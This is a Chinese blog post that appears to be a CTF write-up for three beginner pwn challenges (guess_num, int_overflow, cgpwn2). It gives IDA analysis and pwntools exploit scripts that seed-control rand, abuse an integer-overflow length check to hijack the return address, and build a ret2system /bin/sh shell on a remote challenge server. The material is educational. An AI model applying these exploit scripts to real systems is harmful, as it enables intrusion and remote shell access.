@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>gf713 | 墨水彩笔</title><meta name="author" content="徐小宇"><meta name="copyright" content="徐小宇"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="guess_num查看文件 发现保护全开，但毕竟是新手题，越是这样代表越简单。 使用IDA寻找漏洞 我们先罗列出我们发现的点： 1.首先会有两个输入点，一般输入点都是有漏洞存在的可能的。 2.我们发现这里需要循环对比十次V4和V6的值，十次都成功后会跳转到一个sub_C3E函数。  我们发现该函数可以直接调用system(‘cat flag’)，获取flag。 3.于是我们从两个输入点出发开始寻找">
+<meta property="og:type" content="article">
+<meta property="og:title" content="gf713">
+<meta property="og:url" content="http://example.com/2021/07/13/gf713/index.html">
+<meta property="og:site_name" content="墨水彩笔">
+<meta property="og:description" content="guess_num查看文件 发现保护全开，但毕竟是新手题，越是这样代表越简单。 使用IDA寻找漏洞 我们先罗列出我们发现的点： 1.首先会有两个输入点，一般输入点都是有漏洞存在的可能的。 2.我们发现这里需要循环对比十次V4和V6的值，十次都成功后会跳转到一个sub_C3E函数。  我们发现该函数可以直接调用system(‘cat flag’)，获取flag。 3.于是我们从两个输入点出发开始寻找">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2021-07-13T01:50:18.000Z">
+<meta property="article:modified_time" content="2021-07-15T07:32:17.900Z">
+<meta property="article:author" content="徐小宇">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/07/13/gf713/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  hexoversion: '5.2.0',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isSidebar: true,
+  postUpdate: '2021-07-15 15:32:17'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {
+  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }
+})()</script><meta name="generator" content="Hexo 5.2.0"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">Articles</div><div class="length_num">31</div></a></div></div></div><hr/></div></div><div id="body-wrap"><div id="sidebar"><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#guess-num"><span class="toc-number">1.</span> <span class="toc-text">guess_num</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">查看文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8IDA%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">使用IDA寻找漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">尝试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">1.3.1.</span> <span class="toc-text">第一次尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">第二次尝试</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">知识总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#int-overflow"><span class="toc-number">2.</span> <span class="toc-text">int_overflow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BF%85%E9%A1%BB%E4%BA%86%E8%A7%A3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">2.1.</span> <span class="toc-text">必须了解知识点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="toc-number">2.2.</span> <span class="toc-text">查看保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8IDA%E6%9F%A5%E7%9C%8B%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">利用IDA查看程序运行原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D"><span class="toc-number">2.4.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP"><span class="toc-number">2.5.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cgpwn2"><span class="toc-number">3.</span> <span class="toc-text">cgpwn2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6-1"><span class="toc-number">3.1.</span> <span class="toc-text">查看保护机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87IDA%E6%9D%A5%E5%88%86%E6%9E%90%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.2.</span> <span class="toc-text">通过IDA来分析程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E6%80%9D-1"><span class="toc-number">3.3.</span> <span class="toc-text">构思</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EXP-1"><span class="toc-number">3.4.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">总结：</span></a></li></ol></div></div></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">墨水彩笔</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">gf713</div></div><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2021-07-13T01:50:18.000Z" title="Created 2021-07-13 09:50:18">2021-07-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2021-07-15T07:32:17.900Z" title="Updated 2021-07-15 15:32:17">2021-07-15</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713095137177.png?raw=true" alt="image-20210713095137177.png"></p>
+<p>发现保护全开，但毕竟是新手题，越是这样代表越简单。</p>
+<h2 id="使用IDA寻找漏洞"><a href="#使用IDA寻找漏洞" class="headerlink" title="使用IDA寻找漏洞"></a>使用IDA寻找漏洞</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713095827914.png?raw=true" alt="image-20210713095827914.png"></p>
+<p>我们先罗列出我们发现的点：</p>
+<p>1.首先会有两个输入点，一般输入点都是有漏洞存在的可能的。</p>
+<p>2.我们发现这里需要循环对比十次V4和V6的值，十次都成功后会跳转到一个sub_C3E函数。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713100030173.png?raw=true" alt="image-20210713100030173.png"></p>
+<p>我们发现该函数可以直接调用system(‘cat flag’)，获取flag。</p>
+<p>3.于是我们从两个输入点出发开始寻找。</p>
+<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><h3 id="第一次尝试"><a href="#第一次尝试" class="headerlink" title="第一次尝试"></a>第一次尝试</h3><p>思路：</p>
+<p>我发现V6的变化是在V4输入之前的</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713100750183.png?raw=true" alt="image-20210713100750183.png"></p>
+<p>第一次的时候我没看到要循环对比十次且皆成功才能跳转，于是我想到了能否利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__isoc99_scanf(&quot;%d&quot;, &amp;v4)；				</span><br></pre></td></tr></table></figure>
+
+<p>​    这里的输入使得栈段溢出到v6，从而达到V4==V6的目的。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713100442650.png?raw=true" alt="image-20210713100442650.png"></p>
+<p>并且我发现v4的栈段与v6相隔不远，于是我更加坚定我的想法了。</p>
+<p>于是我开始写EXP</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p &#x3D; process(&#39;713&#39;)</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,51111)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Your name:&#39;)</span><br><span class="line">p.sendline(‘pwn&#39;)</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">	payload&#x3D;&#39;1&#39;*0x4+&#39;a&#39;*0x4+&#39;1&#39;*0x4</span><br><span class="line">	p.recvuntil(&#39;Please input your guess number:&#39;)</span><br><span class="line">	p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最后我发现我不知道怎么构造才能使得v4==v6，而且也一直连接不上。</p>
+<h3 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h3><p>不懂就问，于是我去网上虚心学习了一下。</p>
+<p>发现这一题中我们V6的值的变化与随机数有关，但随机数其实不是完全随机的，而只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</p>
+<p>因此如何控制V6呢？对于该题目，我们将随机种子设置为0或1都可，参考文件中的循环来写脚本。</p>
+<p>并且我们发现泄露rand的值确实和输入有关，但不是V4的输入而是我们刚开始name也是就v7的输入。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713102221328.png?raw=true" alt="image-20210713102221328.png"></p>
+<p>V7的输入和seed随机种子就紧贴在一起，于是我们可以利用溢出使得我们可以直接对其进行控制。</p>
+<p>于是写出EXP：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line">#p &#x3D; process(&#39;713&#39;)</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,51111)</span><br><span class="line">libc &#x3D; cdll.LoadLibrary(&#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0x20 +p64(0)			--P64(1)或者p64(0)都可以满足条件</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Your name:&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">#libc.srand(0)				--实验后发现这句可以有也可以没有</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">	num &#x3D; str(libc.rand()%6+1)</span><br><span class="line">	p.recvuntil(&#39;Please input your guess number:&#39;)</span><br><span class="line">	p.sendline(num)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><p>1.关于随机数的知识</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">关于如何调用随机数有关的库我们可以加入头文件</span><br><span class="line">from ctypes import *</span><br><span class="line">并且对于不同版本的libc好像是不同的于是我们学到了一句语句可以查看</span><br><span class="line">ldd guess_num     --  ldd + 文件名</span><br><span class="line">于是我们可以加入</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713102632297.png?raw=true" alt="image-20210713102632297.png"></p>
+<p>2.对于漏洞点我们又有了新的领悟，exp中也是可以有循环出现的（因为我们的exp是在Python的基础上写出的）。</p>
+<h1 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h1><h2 id="必须了解知识点"><a href="#必须了解知识点" class="headerlink" title="必须了解知识点"></a>必须了解知识点</h2><p>关于整型的概念：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Int8，Int16，Int32，nt64，后面的数字就代表这个数据类型占据的空间。</span><br><span class="line"></span><br><span class="line">Int8, 等于Byte, 占1个字节.  0~255</span><br><span class="line"></span><br><span class="line">Int16, 等于short, 占2个字节. -32768~32767</span><br><span class="line"></span><br><span class="line">Int32, 等于int, 占4个字节. -2147483648~2147483647</span><br><span class="line"></span><br><span class="line">Int64, 等于long, 占8个字节. -9223372036854775808~9223372036854775807</span><br></pre></td></tr></table></figure>
+
+<p>那么为什么会溢出呢？（拿无符号数举例）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int8 最多输入值255，二进制表示为 1111 1111 </span><br><span class="line">倘若输入的是256， 二进制表示为 1 0000 0000</span><br><span class="line">1是溢出的部分， 后八位 0 是识别到的部分，</span><br><span class="line">最后生效的值是 0</span><br></pre></td></tr></table></figure>
+
+<p>这就是整型溢出的基本概念了。</p>
+<h2 id="查看保护机制"><a href="#查看保护机制" class="headerlink" title="查看保护机制"></a>查看保护机制</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713115140526.png?raw=true" alt="image-20210713115140526.png"></p>
+<h2 id="利用IDA查看程序运行原理"><a href="#利用IDA查看程序运行原理" class="headerlink" title="利用IDA查看程序运行原理"></a>利用IDA查看程序运行原理</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713115221400.png?raw=true" alt="image-20210713115221400.png"></p>
+<p>发现有一个登录界面，输入其他按键都会退出。</p>
+<img src="/2021/07/13/gf713/07/13/gf713/image-20210713115256804.png" class title="image-20210713115256804">
+
+<p>登录界面中，有两个输入可以视为疑似漏洞点。但无法确定，于是继续看下去，进入check_passwd（）。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713115430311.png?raw=true" alt="image-20210713115430311.png"></p>
+<p>在第三个框中我们发现这里存在一个复制操作，经过查看发现Buf大小远大于dest的大小，因此这里是一个突破口。我们可以覆盖dest来达到跳转的目的，但我们发现dest至少要覆盖0x14+0x4的空间才能控制跳转，但这个check中我们输入的Buf的长度只能在3-8之间。</p>
+<p>那么如何进行覆盖dest的操作呢？</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713115522339.png?raw=true" alt="image-20210713115522339.png"></p>
+<h2 id="构思"><a href="#构思" class="headerlink" title="构思"></a>构思</h2><p>于是我们便用到了整型溢出，因为我们发现我们Buf在变成buf_lenth后类型属于无符号整数型，且buf_lenth的大小可以比256大，那么也就是说我们可以利用整型溢出使得我们绕过检测，从而达到覆盖dest的目的。<img src="/2021/07/13/gf713/07/13/gf713/image-20210713120202837.png" class title="image-20210713120202837"></p>
+<p>而且我们通过画图分析得到，无论BUF有多长只要我们通过覆盖ret到合适的返回地址就可以了。</p>
+<p>那么那个地址合适呢？</p>
+<p>猜想既然本题给我们了跳转但没有给我们可以写入段且没有空间，那么跳转之后的内容一定是system的内容。于是打开shfit+f12寻找。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713120447867.png?raw=true" alt="image-20210713120447867.png"></p>
+<p>发现确实存在直接cat flag的内容，于是我们把它作为跳转地址。</p>
+<p>但最后发现我是错的，在文件的子函数里面存在的才能使用。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713120543339.png?raw=true" alt="image-20210713120543339.png"></p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,55104)</span><br><span class="line"></span><br><span class="line">system_call &#x3D; 0x0804868b</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Your choice:&#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Please input your username:\n&#39;)</span><br><span class="line">p.sendline(&#39;pwn&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x14+&#39;a&#39;*0x4+p32(system_call)</span><br><span class="line">payload +&#x3D; &#39;a&#39;*(262-len(payload))			--这里就是整型溢出的利用，至于为什么是262呢？</span><br><span class="line">											--其实这里的话259-264之间都是可以的。</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;Please input your passwd:\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h1><h2 id="查看保护机制-1"><a href="#查看保护机制-1" class="headerlink" title="查看保护机制"></a>查看保护机制</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713163054176.png?raw=true" alt="image-20210713163054176.png"></p>
+<p>发现是一个32位的程序。</p>
+<h2 id="通过IDA来分析程序"><a href="#通过IDA来分析程序" class="headerlink" title="通过IDA来分析程序"></a>通过IDA来分析程序</h2><p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713163220510.png?raw=true" alt="image-20210713163220510.png"></p>
+<p>刚开始是一个基本的界面，只有一个hello()函数。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713163302192.png?raw=true" alt="image-20210713163302192.png"></p>
+<p>在hello()中我们发现了两个输入点，并且我们发现fgets和我们之前见到的gets不同。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C 库函数 char *fgets(char *str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</span><br><span class="line"></span><br><span class="line">str -- 这是指向一个字符数组的指针，该数组存储了要读取的字符串。</span><br><span class="line">n -- 这是要读取的最大字符数（包括最后的空字符）。通常是使用以 str 传递的数组长度。</span><br><span class="line">stream -- 这是指向 FILE 对象的指针，该 FILE 对象标识了要从中读取字符的流。</span><br></pre></td></tr></table></figure>
+
+<h2 id="构思-1"><a href="#构思-1" class="headerlink" title="构思"></a>构思</h2><p>我们分别打开name和s看看他们的栈道位置。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713163516426.png?raw=true" alt="image-20210713163516426.png"></p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713163532634.png?raw=true" alt="image-20210713163532634.png"></p>
+<p>首先我们先讲一下name所在的bss也就是可写入段这里的话我们就可以写入自己想写入的一些函数。</p>
+<p>而s中我们可以发现溢出点也就是说，我们可以结合这两个点。</p>
+<p>在s中跳转到bss中去执行系统的命令调用。于是我们去找找有没有system（/bin/sh）等。</p>
+<p><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713163722686.png?raw=true" alt="image-20210713163722686.png"></p>
+<p>我们只发现了一个system但并没有发现’’/bin/sh’’这样的内容，但我们既然可以控制name所在的bss段，我们就可以在其中写入一段/bin/sh，再通过s中的溢出漏洞来实现system的跳转。</p>
+<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&#39;111.200.241.244&#39;,60095)</span><br><span class="line"></span><br><span class="line">system_call &#x3D; 0x8048420</span><br><span class="line">bss &#x3D; 0x804A080</span><br><span class="line"></span><br><span class="line">payload &#x3D;&#39;&#x2F;bin&#x2F;sh\x00&#39;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;please tell me your name\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload &#x3D;&#39;a&#39;*0x26+p32(0)+p32(system_call)+p32(0)+p32(bss)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&#39;hello,you can leave some message here:\n&#39;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然程序运行成功了，但我始终有一个疑惑，在我们调用ret(system)之后为什么我们还需要加入一段p32(0)来填充一段空间呢？</p>
+<p>我们去看看ret(system)的时候发生了什么：<br><img src="https://github.com/xuxiaoyu233/xuxiaoyu233.github.io/blob/picture/gf713/image-20210713164103592.png?raw=true" alt="image-20210713164103592.png"></p>
+<p>我们发现这里并不是直接call的，而是在一顿操作之后才进行call操作。</p>
+<p>并且我们发现我们刚刚在界面中找到的system的地址是要从一次push开始的，也正是这次Push使得rsp减少了一次，我们需要多填充一次，来使得我们传入的参数是/bin/sh。</p>
+<p>如果我们直接把call system的地址写入，就可以不用填充了。</p>
